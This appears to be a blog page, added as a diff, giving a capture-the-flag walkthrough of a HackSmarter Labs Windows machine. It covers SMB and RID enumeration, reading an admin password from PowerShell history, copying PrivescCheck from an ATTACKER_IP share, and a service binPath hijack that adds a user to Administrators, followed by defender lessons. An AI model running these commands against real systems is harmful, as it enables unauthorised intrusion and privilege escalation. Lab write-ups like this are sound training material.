@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Slayer - HackSmarter Labs CTF Walkthrough | Zerotrace Logs</title>
+  <meta name="description" content="Complete walkthrough of Slayer machine from HackSmarter Labs. Learn SMB enumeration, RDP access, PowerShell history credential harvesting, and service binary path manipulation techniques on Windows 11/Server 2025." />
+
+  <!-- Essential Open Graph tags for LinkedIn -->
+  <meta property="og:title" content="Slayer CTF Walkthrough - HackSmarter Labs | Z3rotrace" />
+  <meta property="og:description" content="Windows privilege escalation via PowerShell history credential leak and service binary path manipulation. Two distinct paths to Administrator on Windows 11/Server 2025." />
+  <meta property="og:image" content="https://z3rotrace.live/assets/slayer/root-flag-elevated.png" />
+  <meta property="og:url" content="https://z3rotrace.live/writeups/slayer.html" />
+  <meta property="og:type" content="article" />
+
+  <!-- Twitter Card tags -->
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Slayer CTF Walkthrough - HackSmarter Labs | Z3rotrace" />
+  <meta name="twitter:description" content="Windows privilege escalation via PowerShell history credential leak and service binary path manipulation on Windows 11/Server 2025." />
+  <meta name="twitter:image" content="https://z3rotrace.live/assets/slayer/root-flag-elevated.png" />
+
+  <link rel="icon" type="image/png" href="../assets/favicon.png" sizes="32x32" />
+  <link rel="apple-touch-icon" href="../assets/favicon.png" />
+  <link rel="stylesheet" href="../style.css?v=4"/>
+  <style>
+    /* Machine info box styling */
+    .machine-info {
+      background: rgba(0, 170, 255, 0.05);
+      border: 1px solid rgba(0, 170, 255, 0.25);
+      border-left: 4px solid #c77dff;
+      border-radius: 8px;
+      padding: 1rem 1.25rem;
+      margin: 1.5rem 0;
+    }
+
+    .machine-info ul {
+      margin: 0;
+      padding-left: 0;
+    }
+
+    .machine-info li {
+      margin-bottom: 0.25rem;
+    }
+
+    .machine-info li::before {
+      color: #00aaff;
+    }
+
+    /* Attack chain summary box */
+    .attack-chain {
+      background: rgba(199, 125, 255, 0.05);
+      border: 1px solid rgba(199, 125, 255, 0.25);
+      border-left: 4px solid #c77dff;
+      border-radius: 8px;
+      padding: 1rem 1.25rem;
+      margin: 1.5rem 0;
+    }
+
+    .attack-chain ol {
+      margin: 0;
+    }
+
+    /* Key finding callout */
+    .key-finding {
+      background: rgba(255, 107, 107, 0.08);
+      border-left: 4px solid #ff6b6b;
+      padding: 0.75rem 1rem;
+      margin: 1rem 0;
+      border-radius: 0 6px 6px 0;
+    }
+
+    .key-finding strong {
+      color: #ff6b6b;
+    }
+
+    /* Tool list styling */
+    .tools-list {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.5rem;
+      margin: 1rem 0;
+      padding: 0;
+    }
+
+    .tools-list li {
+      background: rgba(0, 170, 255, 0.08);
+      border: 1px solid rgba(0, 170, 255, 0.2);
+      border-radius: 6px;
+      padding: 0.4rem 0.8rem;
+      font-size: 0.9rem;
+      margin: 0;
+    }
+
+    .tools-list li::before {
+      content: none;
+    }
+
+    /* Lessons learned styling */
+    .lessons-learned li {
+      margin-bottom: 0.75rem;
+    }
+
+    /* Path indicator styling */
+    .path-indicator {
+      background: rgba(199, 125, 255, 0.1);
+      border: 1px solid rgba(199, 125, 255, 0.3);
+      border-radius: 6px;
+      padding: 0.5rem 1rem;
+      margin: 1rem 0;
+      display: inline-block;
+    }
+
+    .path-indicator strong {
+      color: #c77dff;
+    }
+  </style>
+</head>
+<body>
+<header>
+  <h1 class="terminal-title" aria-label="Zerotrace Logs">
+    <span class="prompt" aria-hidden="true">$</span>
+    <span class="typed" id="term-typing" aria-hidden="true"></span>
+    <span class="cursor" id="term-cursor" aria-hidden="true"></span>
+    <span class="sr-only">Zerotrace Logs</span>
+  </h1>
+</header>
+
+<!-- Side hamburger control -->
+<button id="sidebarToggle" class="hamburger-btn" aria-label="Toggle navigation" aria-controls="sidebar" aria-expanded="true">
+  <span class="sr-only">Toggle navigation</span>
+  <span class="hamburger-icon" aria-hidden="true"></span>
+</button>
+
+<!-- Sidebar navigation -->
+<aside class="sidebar" id="sidebar" aria-label="Main navigation">
+  <div class="sidebar-header">
+    <h3>Navigate</h3>
+    <button id="sidebarClose" class="sidebar-close" aria-label="Close navigation"><span aria-hidden="true">x</span></button>
+  </div>
+  <div class="sidebar-content">
+    <ul class="sidebar-nav">
+      <li><a href="../index.html">Home</a></li>
+      <li class="has-submenu">
+        <button class="submenu-toggle" aria-expanded="true"><span class="arrow" aria-hidden="true"></span>Writeups</button>
+        <ul class="submenu">
+          <li><a href="welcome.html">Welcome - ADCS ESC1</a></li>
+          <li><a href="staged.html">Staged - HackSmarter Labs</a></li>
+          <li><a href="buildingmagic.html">BuildingMagic - HackSmarter Labs</a></li>
+          <li><a href="arasaka.html">Arasaka - HackSmarter Labs</a></li>
+          <li><a href="midgarden2-badsuccessor.html">Midgarden2 - BadSuccessor</a></li>
+          <li><a href="banksmarter.html">BankSmarter - HackSmarter Labs</a></li>
+          <li><a href="ascension.html">Ascension - HackSmarter Labs</a></li>
+          <li><a href="slayer.html" aria-current="page">Slayer - HackSmarter Labs</a></li>
+          <li><a href="ps-file-transfer-dns.html">PS File Transfer via DNS Lookup</a></li>
+          <li><a href="sliver-c2-getting-started.html">Getting Started with Sliver C2</a></li>
+        </ul>
+      </li>
+      <li class="has-submenu">
+        <button class="submenu-toggle" aria-expanded="false"><span class="arrow" aria-hidden="true"></span>Machines Walkthroughs</button>
+        <ul class="submenu" hidden>
+          <li><a href="../walkthroughs/sharethepain.html">ShareThePain</a></li>
+        </ul>
+      </li>
+      <li><a href="../vector3.html">Certification Journey</a></li>
+      <li class="has-submenu">
+        <button class="submenu-toggle" aria-expanded="false"><span class="arrow" aria-hidden="true"></span>Projects</button>
+        <ul class="submenu" hidden>
+          <li><a href="../projects/dual-cloud-c2-redirector.html">Dual Cloud Redirector C2</a></li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+</aside>
+<div class="sidebar-backdrop" id="sidebarBackdrop" aria-hidden="true"></div>
+
+<section>
+  <h2>Slayer - HackSmarter Labs CTF Walkthrough</h2>
+
+  <div class="machine-info">
+    <ul>
+      <li><strong>Platform:</strong> HackSmarter Labs</li>
+      <li><strong>Difficulty:</strong> Medium</li>
+      <li><strong>OS:</strong> Windows 11 / Server 2025</li>
+      <li><strong>Key Skills:</strong> SMB Enumeration, RDP Access, PowerShell History Analysis, Service Binary Path Manipulation</li>
+    </ul>
+  </div>
+
+  <h3>Objective</h3>
+  <p>Following a successful social engineering engagement, I obtained user-level credentials for a corporate workstation. The goal is to leverage this initial access to perform reconnaissance on the internal Windows host, escalate privileges, and capture the root flag from the administrator's directory.</p>
+
+  <div class="key-finding">
+    <strong>Starting Credentials:</strong> <code>tyler.ramsey:P@ssw0rd!</code>
+  </div>
+
+  <h2>Reconnaissance</h2>
+
+  <h3><span class="step">[Step 1]</span> Nmap Scan</h3>
+  <p>I started with a comprehensive port scan to identify available services:</p>
+  <pre><code>$ nmap -p- -T4 -sC -sV -Pn 10.1.140.139 -oN nmap_scan</code></pre>
+
+  <div class="question">
+    <strong>What are these Nmap flags?</strong>
+  </div>
+  <div class="answer">
+    <ul>
+      <li><code>-p-</code> scans all 65535 ports</li>
+      <li><code>-T4</code> sets aggressive timing for faster scans</li>
+      <li><code>-sC</code> runs default NSE scripts for service enumeration</li>
+      <li><code>-sV</code> probes for service versions</li>
+      <li><code>-Pn</code> skips host discovery (assumes host is up)</li>
+      <li><code>-oN</code> saves output in normal format</li>
+    </ul>
+  </div>
+
+  <pre><code>Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-05 06:04 EST
+Nmap scan report for 10.1.140.139
+Host is up (0.13s latency).
+Not shown: 65531 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+135/tcp   open  msrpc         Microsoft Windows RPC
+445/tcp   open  microsoft-ds?
+3389/tcp  open  ms-wbt-server
+| rdp-ntlm-info:
+|   Target_Name: EC2AMAZ-M1LFCNO
+|   NetBIOS_Domain_Name: EC2AMAZ-M1LFCNO
+|   NetBIOS_Computer_Name: EC2AMAZ-M1LFCNO
+|   DNS_Domain_Name: EC2AMAZ-M1LFCNO
+|   DNS_Computer_Name: EC2AMAZ-M1LFCNO
+|   Product_Version: 10.0.26100
+|_  System_Time: 2026-01-05T11:14:45+00:00
+| ssl-cert: Subject: commonName=EC2AMAZ-M1LFCNO
+| Not valid before: 2025-09-29T10:51:47
+|_Not valid after:  2026-03-31T10:51:47
+49669/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled but not required</code></pre>
+
+  <p><strong>Key findings:</strong></p>
+  <ul>
+    <li><strong>SMB (445)</strong> - File sharing, potential credential validation</li>
+    <li><strong>RDP (3389)</strong> - Remote desktop access</li>
+    <li><strong>RPC ports (135, 49669)</strong> - Standard Windows services</li>
+    <li><strong>SMB signing not required</strong> - Could allow relay attacks in a larger environment</li>
+  </ul>
+
+  <h2>Enumeration</h2>
+
+  <h3><span class="step">[Step 2]</span> Validating Credentials via SMB</h3>
+  <p>I used NetExec to validate the provided credentials and enumerate accessible shares:</p>
+
+  <p><img src="../assets/slayer/smb-credential-validation.png" alt="Validating SMB credentials with NetExec" loading="lazy"></p>
+
+  <pre><code>$ nxc smb 10.1.140.139 -u tyler.ramsey -p 'P@ssw0rd!' --shares</code></pre>
+
+  <pre><code>SMB         10.1.140.139    445    EC2AMAZ-M1LFCNO  [*] Windows 11 / Server 2025 Build 26100 x64 (name:EC2AMAZ-M1LFCNO) (domain:EC2AMAZ-M1LFCNO) (signing:False) (SMBv1:None)
+SMB         10.1.140.139    445    EC2AMAZ-M1LFCNO  [+] EC2AMAZ-M1LFCNO\tyler.ramsey:P@ssw0rd!
+SMB         10.1.140.139    445    EC2AMAZ-M1LFCNO  [*] Enumerated shares
+SMB         10.1.140.139    445    EC2AMAZ-M1LFCNO  Share           Permissions     Remark
+SMB         10.1.140.139    445    EC2AMAZ-M1LFCNO  -----           -----------     ------
+SMB         10.1.140.139    445    EC2AMAZ-M1LFCNO  ADMIN$                          Remote Admin
+SMB         10.1.140.139    445    EC2AMAZ-M1LFCNO  C$                              Default share
+SMB         10.1.140.139    445    EC2AMAZ-M1LFCNO  IPC$            READ            Remote IPC</code></pre>
+
+  <p>The credentials are valid, but I only have read access to IPC$ (no access to administrative shares).</p>
+
+  <h3><span class="step">[Step 3]</span> RID Brute Force for User Enumeration</h3>
+
+  <div class="question">
+    <strong>What is RID Brute Forcing?</strong>
+  </div>
+  <div class="answer">
+    <p>RID (Relative Identifier) brute forcing enumerates user and group accounts by querying sequential RID values via SMB. It works because Windows assigns predictable RIDs to accounts (e.g., Administrator is always RID 500, Guest is 501, and custom accounts start at 1000).</p>
+  </div>
+
+  <pre><code>$ nxc smb 10.1.140.139 -u tyler.ramsey -p 'P@ssw0rd!' --rid-brute</code></pre>
+
+  <pre><code>SMB         10.1.140.139    445    EC2AMAZ-M1LFCNO  500: EC2AMAZ-M1LFCNO\Administrator (SidTypeUser)
+SMB         10.1.140.139    445    EC2AMAZ-M1LFCNO  501: EC2AMAZ-M1LFCNO\Guest (SidTypeUser)
+SMB         10.1.140.139    445    EC2AMAZ-M1LFCNO  503: EC2AMAZ-M1LFCNO\DefaultAccount (SidTypeUser)
+SMB         10.1.140.139    445    EC2AMAZ-M1LFCNO  504: EC2AMAZ-M1LFCNO\WDAGUtilityAccount (SidTypeUser)
+SMB         10.1.140.139    445    EC2AMAZ-M1LFCNO  513: EC2AMAZ-M1LFCNO\None (SidTypeGroup)
+SMB         10.1.140.139    445    EC2AMAZ-M1LFCNO  1000: EC2AMAZ-M1LFCNO\tyler.ramsey (SidTypeUser)
+SMB         10.1.140.139    445    EC2AMAZ-M1LFCNO  1002: EC2AMAZ-M1LFCNO\alice.wonderland (SidTypeUser)</code></pre>
+
+  <p>I discovered another user account: <code>alice.wonderland</code> - this could be useful later.</p>
+
+  <h3><span class="step">[Step 4]</span> RDP Access</h3>
+  <p>With port 3389 open, I connected via RDP using the provided credentials:</p>
+  <pre><code>$ xfreerdp /u:tyler.ramsey /p:'P@ssw0rd!' /v:10.1.140.139</code></pre>
+
+  <p><img src="../assets/slayer/rdp-session.png" alt="RDP session established as tyler.ramsey" loading="lazy"></p>
+
+  <h2>Privilege Escalation</h2>
+  <p>This machine has two viable privilege escalation paths. I will document both.</p>
+
+  <div class="path-indicator">
+    <strong>Path 1:</strong> PowerShell History Credential Leak (Fastest)
+  </div>
+
+  <h3><span class="step">[Step 5]</span> PowerShell History Analysis</h3>
+
+  <div class="question">
+    <strong>What is PowerShell History?</strong>
+  </div>
+  <div class="answer">
+    <p>PowerShell stores command history in a file called <code>ConsoleHost_history.txt</code>. This file often contains sensitive commands including passwords passed as arguments. It is a common target during post-exploitation because administrators frequently run commands like <code>net user</code> with plaintext passwords.</p>
+  </div>
+
+  <p>After connecting via RDP, I checked the PowerShell command history:</p>
+  <pre><code>PS C:\> (Get-PSReadlineOption).HistorySavePath
+C:\Users\tyler.ramsey\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+PS C:\> type C:\Users\tyler.ramsey\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+net user administrator "ebz0yxy3txh9BDE*yeh"</code></pre>
+
+  <div class="key-finding">
+    <strong>Administrator password discovered:</strong> <code>ebz0yxy3txh9BDE*yeh</code>
+  </div>
+
+  <h3><span class="step">[Step 6]</span> Validating Administrator Credentials</h3>
+  <p>I verified the credentials work using NetExec:</p>
+  <pre><code>$ nxc smb 10.1.140.139 -u administrator -p 'ebz0yxy3txh9BDE*yeh'</code></pre>
+
+  <p><img src="../assets/slayer/admin-creds-validated.png" alt="Administrator credentials validated via SMB" loading="lazy"></p>
+
+  <h3><span class="step">[Step 7]</span> Getting a Shell with wmiexec2</h3>
+
+  <div class="question">
+    <strong>What is wmiexec2?</strong>
+  </div>
+  <div class="answer">
+    <p>wmiexec2 is an improved version of Impacket's wmiexec that provides a semi-interactive shell over WMI (Windows Management Instrumentation). It is useful when direct SMB execution (psexec/smbexec) is blocked or unavailable.</p>
+  </div>
+
+  <p><strong>Installation:</strong></p>
+  <pre><code>$ git clone https://github.com/ice-wzl/wmiexec2
+$ cd wmiexec2
+$ python3 -m venv venv
+$ source venv/bin/activate
+$ pip install -r requirements.txt
+$ pip install setuptools</code></pre>
+
+  <p><strong>Getting the root flag:</strong></p>
+  <pre><code>$ ./wmiexec2.py EC2AMAZ-M1LFCNO/administrator@10.1.140.139
+Password: [ebz0yxy3txh9BDE*yeh]
+[*] SMBv3.0 dialect used
+[*] Launching wmiexec2
+[*] Press help for extra shell commands
+
+C:\> cd C:\Users\Administrator\Desktop
+
+C:\Users\Administrator\Desktop> dir
+ Volume in drive C is Windows
+ Volume Serial Number is 7EC2-1A39
+
+ Directory of C:\Users\Administrator\Desktop
+
+10/14/2025  03:20 PM    &lt;DIR&gt;          .
+10/14/2025  10:57 PM    &lt;DIR&gt;          ..
+11/14/2024  01:03 AM               470 EC2 Feedback.url
+11/14/2024  01:03 AM               501 EC2 Microsoft Windows Guide.url
+09/30/2025  05:40 PM             2,351 Microsoft Edge.lnk
+10/14/2025  03:20 PM                32 root.txt
+               4 File(s)          3,354 bytes
+               2 Dir(s)   6,580,862,976 bytes free
+
+C:\Users\Administrator\Desktop> type root.txt
+38355....</code></pre>
+
+  <div class="path-indicator">
+    <strong>Path 2:</strong> Weak Service Permissions (Alternative Method)
+  </div>
+
+  <h3><span class="step">[Step 8]</span> Finding Hidden Credentials</h3>
+  <p>During manual enumeration, I discovered a <code>C:\Management</code> directory. Using the <code>-Force</code> flag to show hidden files:</p>
+
+  <pre><code>PS C:\Management> dir -Force
+
+    Directory: C:\Management
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         9/30/2025   6:18 PM           2030 Board Meeting Minutes - 2025-09-10.pdf
+-a----         9/30/2025   6:18 PM           1940 Customer Feedback Summary - 2025 Q3.pdf
+-a-hs-         9/30/2025   5:50 PM             71 desktop.ini
+-a----         9/30/2025   6:18 PM           2044 Executive Summary - Q3 2025.pdf
+...</code></pre>
+
+  <div class="note">
+    <strong>Note:</strong> The <code>a-hs-</code> flags indicate: <code>a</code> = archive, <code>h</code> = hidden, <code>s</code> = system. Hidden and system files are not shown by default, which is why <code>-Force</code> is needed.
+  </div>
+
+  <p>The hidden <code>desktop.ini</code> file contains credentials:</p>
+  <pre><code>PS C:\Management> type .\desktop.ini
+[.ShellClassInfo]
+InfoTip=CREDS: alice.wonderland:2wsxzaq1@WSXZAQ!</code></pre>
+
+  <div class="key-finding">
+    <strong>New credentials discovered:</strong> <code>alice.wonderland:2wsxzaq1@WSXZAQ!</code>
+  </div>
+
+  <p>I used these credentials to establish a new RDP session as <code>alice.wonderland</code>.</p>
+
+  <h3><span class="step">[Step 9]</span> Automated Privilege Escalation Enumeration</h3>
+
+  <div class="question">
+    <strong>What is PrivescCheck?</strong>
+  </div>
+  <div class="answer">
+    <p>PrivescCheck is a PowerShell script that enumerates common Windows privilege escalation vectors including service misconfigurations, scheduled tasks, registry permissions, unquoted service paths, and more. It is similar to winPEAS but written entirely in PowerShell.</p>
+  </div>
+
+  <p><strong>Setting up file transfer via SMB:</strong></p>
+  <pre><code>$ impacket-smbserver sharename . -smb2support -username panos -password panos123</code></pre>
+
+  <p>On the target, connect to the share and copy PrivescCheck:</p>
+  <pre><code>PS C:\> net use \\ATTACKER_IP\sharename /user:panos panos123
+PS C:\> copy \\ATTACKER_IP\sharename\PrivescCheck.ps1 C:\Users\alice.wonderland\</code></pre>
+
+  <p><img src="../assets/slayer/privesccheck-transfer.png" alt="Transferring PrivescCheck to target via SMB" loading="lazy"></p>
+
+  <p><strong>Running the scan:</strong></p>
+  <pre><code>PS C:\> powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML"</code></pre>
+
+  <p>The results showed a high-severity finding in the Services category:</p>
+
+  <p><img src="../assets/slayer/privesccheck-results.png" alt="PrivescCheck results showing service vulnerability" loading="lazy"></p>
+
+  <p>Reviewing the HTML report revealed a service binary path manipulation vulnerability:</p>
+
+  <p><img src="../assets/slayer/service-vulnerability-details.png" alt="Service binary path vulnerability details in HTML report" loading="lazy"></p>
+
+  <h3><span class="step">[Step 10]</span> Analyzing Service Permissions</h3>
+
+  <div class="question">
+    <strong>What is Service Binary Path Manipulation?</strong>
+  </div>
+  <div class="answer">
+    <p>When a low-privileged user has permissions to modify a service's configuration (specifically the binary path via <code>SERVICE_CHANGE_CONFIG</code>), they can change it to execute arbitrary commands. When the service starts (often as SYSTEM), the attacker's command runs with elevated privileges.</p>
+  </div>
+
+  <p>I analyzed the service permissions using a custom script that decodes Windows SDDL (Security Descriptor Definition Language):</p>
+
+  <p><img src="../assets/slayer/service-permission-analysis.png" alt="Service permission analysis showing exploitable permissions" loading="lazy"></p>
+
+  <p>The analysis revealed that the <code>alice.wonderland</code> user can change the service configuration for <code>SysMgmtAgent</code>.</p>
+
+  <h3><span class="step">[Step 11]</span> Exploiting the Service</h3>
+  <p>I modified the service binary path to add <code>tyler.ramsey</code> to the local Administrators group:</p>
+
+  <pre><code>C:\Users\alice.wonderland> sc config SysMgmtAgent binPath= "cmd.exe /c net localgroup Administrators /add tyler.ramsey"
+[SC] ChangeServiceConfig SUCCESS
+
+C:\Users\alice.wonderland> sc start SysMgmtAgent</code></pre>
+
+  <div class="note">
+    <strong>Note:</strong> The space after <code>binPath=</code> is required by the <code>sc</code> command syntax.
+  </div>
+
+  <p><strong>Verifying the privilege escalation:</strong></p>
+  <pre><code>C:\Users\alice.wonderland> net localgroup Administrators
+Alias name     Administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+tyler.ramsey
+The command completed successfully.</code></pre>
+
+  <h3><span class="step">[Step 12]</span> Getting the Root Flag</h3>
+  <p>With <code>tyler.ramsey</code> now in the Administrators group, I logged out and back in (or opened an elevated PowerShell session) to retrieve the flag:</p>
+
+  <p><img src="../assets/slayer/root-flag-elevated.png" alt="Root flag obtained via elevated PowerShell" loading="lazy"></p>
+
+  <pre><code>PS C:\> type C:\Users\Administrator\Desktop\root.txt
+38355....</code></pre>
+
+  <h2>Attack Chain Summary</h2>
+
+  <div class="attack-chain">
+    <p><strong>Path 1 (Fast Track):</strong></p>
+    <ol>
+      <li><strong>Credential Validation:</strong> Verified tyler.ramsey credentials via SMB</li>
+      <li><strong>RDP Access:</strong> Connected to workstation as tyler.ramsey</li>
+      <li><strong>PowerShell History:</strong> Found Administrator password in command history</li>
+      <li><strong>WMI Shell:</strong> Used wmiexec2 to retrieve root flag</li>
+    </ol>
+  </div>
+
+  <div class="attack-chain">
+    <p><strong>Path 2 (Service Exploitation):</strong></p>
+    <ol>
+      <li><strong>Hidden Credential Discovery:</strong> Found alice.wonderland password in desktop.ini</li>
+      <li><strong>Lateral Movement:</strong> RDP as alice.wonderland</li>
+      <li><strong>Service Enumeration:</strong> PrivescCheck identified weak service permissions</li>
+      <li><strong>Service Exploitation:</strong> Modified SysMgmtAgent binary path</li>
+      <li><strong>Privilege Escalation:</strong> Added tyler.ramsey to Administrators group</li>
+    </ol>
+  </div>
+
+  <h2>Tools Used</h2>
+  <ul class="tools-list">
+    <li><strong>Nmap</strong> - Port scanning</li>
+    <li><strong>NetExec (nxc)</strong> - SMB enumeration</li>
+    <li><strong>xfreerdp</strong> - RDP client</li>
+    <li><strong>wmiexec2</strong> - WMI shell</li>
+    <li><strong>PrivescCheck</strong> - Privilege escalation enumeration</li>
+    <li><strong>Impacket SMB Server</strong> - File transfer</li>
+  </ul>
+
+  <h2>Lessons Learned</h2>
+
+  <h3><span class="step defender">For Defenders</span></h3>
+  <div class="answer lessons-learned">
+    <ul>
+      <li><strong>Clear PowerShell history regularly</strong> or use <code>Set-PSReadLineOption -HistorySaveStyle SaveNothing</code></li>
+      <li><strong>Never pass passwords as command-line arguments</strong> - use <code>Get-Credential</code> or secure vaults</li>
+      <li><strong>Audit service permissions</strong> using tools like <code>accesschk.exe</code> or PrivescCheck</li>
+      <li><strong>Avoid storing credentials in plaintext files</strong> (even hidden ones)</li>
+      <li><strong>Apply the principle of least privilege</strong> to service configurations</li>
+    </ul>
+  </div>
+
+  <h3><span class="step redteam">For Red Teamers</span></h3>
+  <div class="answer lessons-learned">
+    <ul>
+      <li>Always check PowerShell history - it is a goldmine for credentials</li>
+      <li>Hidden files often contain sensitive information - use <code>dir -Force</code> or <code>Get-ChildItem -Hidden</code></li>
+      <li>Service misconfigurations are common on Windows - always enumerate with PrivescCheck or similar tools</li>
+      <li>Multiple privilege escalation paths may exist - document alternatives for when primary paths are blocked</li>
+    </ul>
+  </div>
+
+  <p><em>Walkthrough by Zerotrace | HackSmarter Labs</em></p>
+
+</section>
+
+<footer>
+  <div class="social-links" aria-label="Social media">
+    <a href="https://github.com/0x0Trace" class="social github" target="_blank" rel="noopener" aria-label="GitHub profile">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path fill="#00B8D9" d="M12 .5C5.65.5.5 5.65.5 12c0 5.08 3.29 9.38 7.86 10.9.58.1.8-.25.8-.56 0-.27-.01-1.14-.02-2.07-3.2.7-3.88-1.36-3.88-1.36-.53-1.34-1.3-1.7-1.3-1.7-1.06-.73.08-.72.08-.72 1.17.08 1.78 1.2 1.78 1.2 1.05 1.79 2.75 1.27 3.42.97.11-.76.41-1.27.75-1.56-2.55-.29-5.23-1.28-5.23-5.7 0-1.26.45-2.3 1.2-3.11-.12-.29-.52-1.46.11-3.04 0 0 .97-.31 3.18 1.19a11.08 11.08 0 0 1 2.9-.39c.98 0 1.97.13 2.9.39 2.2-1.5 3.17-1.19 3.17-1.19.63 1.58.23 2.75.12 3.04.75.81 1.2 1.85 1.2 3.11 0 4.43-2.69 5.41-5.25 5.69.42.36.8 1.08.8 2.18 0 1.58-.02 2.85-.02 3.24 0 .31.21.67.81.55A10.52 10.52 0 0 0 23.5 12c0-6.35-5.15-11.5-11.5-11.5Z"/>
+      </svg>
+    </a>
+    <a href="mailto:contact@z3rotrace.live" class="social email" aria-label="E-mail">
+      <svg width="20" height="20" viewBox="0 0 512 512" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path fill="#00B8D9" d="M502.3 190.8L327.4 338.9C304.3 358.3 271.7 358.3 248.6 338.9L9.7 190.8C3.2 185.5 0 178.3 0 171.2V80C0 53.5 21.5 32 48 32H464C490.5 32 512 53.5 512 80V171.2C512 178.3 508.8 185.5 502.3 190.8Z"/>
+        <path fill="#00B8D9" d="M0 255.1V432C0 458.5 21.5 480 48 480H464C490.5 480 512 458.5 512 432V255.1L343.9 392.7C304.5 423 247.6 423 208.1 392.7L0 255.1Z"/>
+      </svg>
+    </a>
+    <a href="https://www.linkedin.com/in/panagiotis-lampousis-2a100b392/" class="social linkedin" target="_blank" rel="noopener" aria-label="LinkedIn profile">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path fill="#00B8D9" d="M4.98 3.5c0 1.38-1.13 2.5-2.5 2.5A2.5 2.5 0 0 1 0 3.5C0 2.12 1.12 1 2.49 1a2.5 2.5 0 0 1 2.49 2.5ZM.5 23.5h4V7.99h-4V23.5Zm7.5 0h4v-8.32c0-2.21 2.4-3.46 3.94-2.02.5.47.56 1.13.56 1.86v8.48h4v-9.56c0-5.06-5.5-4.86-6.5-2.38V8h-4c.06 1.05 0 15.5 0 15.5Z"/>
+      </svg>
+    </a>
+  </div>
+  <p>&copy; 2025 Zerotrace | Built by Zerotrace | <a href="../terms-of-use.html" style="color: #00B8D9; text-decoration: underline;">Terms of Use</a></p>
+</footer>
+<script src="../script.js"></script>
+</body>
+</html>
